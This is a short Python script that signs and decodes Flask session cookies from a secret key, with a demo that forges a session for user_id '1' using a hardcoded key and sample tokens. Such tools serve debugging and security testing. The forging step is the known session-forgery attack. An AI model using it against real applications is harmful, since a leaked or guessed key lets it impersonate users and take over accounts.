#!/usr/bin/env python
from flask.sessions import SecureCookieSessionInterface
from itsdangerous import URLSafeTimedSerializer

class SimpleSecureCookieSessionInterface(SecureCookieSessionInterface):
	# Override method
	# Take secret_key instead of an instance of a Flask app
	def get_signing_serializer(self, secret_key):
		if not secret_key:
			return None
		signer_kwargs = dict(
			key_derivation=self.key_derivation,
			digest_method=self.digest_method
		)
		return URLSafeTimedSerializer(secret_key, salt=self.salt,
		                              serializer=self.serializer,
		                              signer_kwargs=signer_kwargs)

def decodeFlaskCookie(secret_key, cookieValue):
	sscsi = SimpleSecureCookieSessionInterface()
	signingSerializer = sscsi.get_signing_serializer(secret_key)
	return signingSerializer.loads(cookieValue)

# Keep in mind that flask uses unicode strings for the
# dictionary keys
def encodeFlaskCookie(secret_key, cookieDict):
	sscsi = SimpleSecureCookieSessionInterface()
	signingSerializer = sscsi.get_signing_serializer(secret_key)
	return signingSerializer.dumps(cookieDict)

if __name__=='__main__':
	sk = '73e1f2c96e364f0cc3371c31927ed156'
	sessionDict = {
	    "_fresh": True,
	    "_id": "8dfeaa4e93ec41d36e6c1a250224a6915535b02a7d70c9aaba6e6d8e14b5ca768a6e9860edf86e7b3bdde5d8892f5637735f6a66a0df80f81ce0cabd00e73781",
	    "csrf_token": "1c807dd30249c55d62457114afb9727cba69fe86",
	    "user_id": "1"
	}
	cookie = encodeFlaskCookie(sk, sessionDict)
	print(cookie)
	decodedDict = decodeFlaskCookie(sk, cookie)
	assert sessionDict==decodedDict
